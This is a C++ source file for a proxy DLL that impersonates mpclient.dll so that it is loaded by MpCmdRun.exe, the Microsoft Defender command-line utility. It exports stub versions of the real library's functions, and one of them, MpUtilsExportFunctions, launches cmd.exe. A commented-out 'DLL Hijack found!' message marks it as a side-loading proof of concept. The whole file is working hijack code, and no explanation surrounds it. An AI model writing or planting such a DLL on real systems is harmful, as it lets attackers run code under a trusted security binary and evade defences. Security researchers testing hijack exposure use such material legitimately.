// MpCmdRun.exe - mpclient.dll
#include <windows.h>

#pragma comment (lib, "User32.lib")

int Main() {
    //MessageBoxW(0, L"DLL Hijack found!", L"DLL Hijack", 0);
    SHELLEXECUTEINFO shell_info;
    ZeroMemory(&shell_info, sizeof(shell_info));

    shell_info.cbSize = sizeof(SHELLEXECUTEINFO);
    shell_info.fMask = SEE_MASK_DEFAULT;
    shell_info.hwnd = NULL;
    shell_info.lpVerb = NULL;
    shell_info.lpFile = (LPCSTR)"C:\\Windows\\System32\\cmd.exe";
    shell_info.lpParameters = NULL;
    shell_info.lpDirectory = NULL;
    shell_info.nShow = SW_NORMAL;
    shell_info.hInstApp = NULL;
    ShellExecuteEx(&shell_info);
    return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void MpQueryEngineConfigDword(){}
extern "C" __declspec(dllexport) void MpGetSampleChunk(){}
extern "C" __declspec(dllexport) void MpConveySampleSubmissionResult(){}
extern "C" __declspec(dllexport) void MpSampleSubmit(){}
extern "C" __declspec(dllexport) void MpSampleQuery(){}
extern "C" __declspec(dllexport) void MpUpdateStart(){}
extern "C" __declspec(dllexport) void MpClientUtilExportFunctions(){}
extern "C" __declspec(dllexport) void MpConfigInitialize(){}
extern "C" __declspec(dllexport) void MpConfigOpen(){}
extern "C" __declspec(dllexport) void MpWDEnable(){}
extern "C" __declspec(dllexport) void MpUpdatePlatform(){}
extern "C" __declspec(dllexport) void MpConfigUninitialize(){}
extern "C" __declspec(dllexport) void MpConfigClose(){}
extern "C" __declspec(dllexport) void MpFreeMemory(){}
extern "C" __declspec(dllexport) void MpHandleClose(){}
extern "C" __declspec(dllexport) void MpThreatOpen(){}
extern "C" __declspec(dllexport) void MpThreatEnumerate(){}
extern "C" __declspec(dllexport) void MpScanResult(){ }
extern "C" __declspec(dllexport) void MpManagerOpen(){}
extern "C" __declspec(dllexport) void MpScanControl(){ }
extern "C" __declspec(dllexport) void MpScanStartEx(){}
extern "C" __declspec(dllexport) void MpCleanOpen(){}
extern "C" __declspec(dllexport) void MpCleanStart(){}
extern "C" __declspec(dllexport) void MpConfigGetValue(){}
extern "C" __declspec(dllexport) void MpUpdateStartEx(){}
extern "C" __declspec(dllexport) void MpManagerVersionQuery(){}
extern "C" __declspec(dllexport) void MpAddDynamicSignatureFile(){}
extern "C" __declspec(dllexport) void MpUtilsExportFunctions(){ Main(); }
extern "C" __declspec(dllexport) void MpAllocMemory(){}
extern "C" __declspec(dllexport) void MpConfigSetValue(){}
extern "C" __declspec(dllexport) void MpRemoveDynamicSignatureFile(){}
extern "C" __declspec(dllexport) void MpDynamicSignatureOpen(){}
extern "C" __declspec(dllexport) void MpDynamicSignatureEnumerate(){}
extern "C" __declspec(dllexport) void MpConfigGetValueAlloc(){}
extern "C" __declspec(dllexport) void MpGetTaskSchedulerStrings(){}
extern "C" __declspec(dllexport) void MpManagerStatusQuery(){}
extern "C" __declspec(dllexport) void MpConfigIteratorOpen(){}
extern "C" __declspec(dllexport) void MpConfigIteratorEnum(){}
extern "C" __declspec(dllexport) void MpConfigIteratorClose(){}
extern "C" __declspec(dllexport) void MpNetworkCapture(){}
extern "C" __declspec(dllexport) void MpConfigDelValue(){}
extern "C" __declspec(dllexport) void MpManagerEnable(){}
extern "C" __declspec(dllexport) void MpQuarantineRequest(){}
extern "C" __declspec(dllexport) void MpManagerStatusQueryEx(){}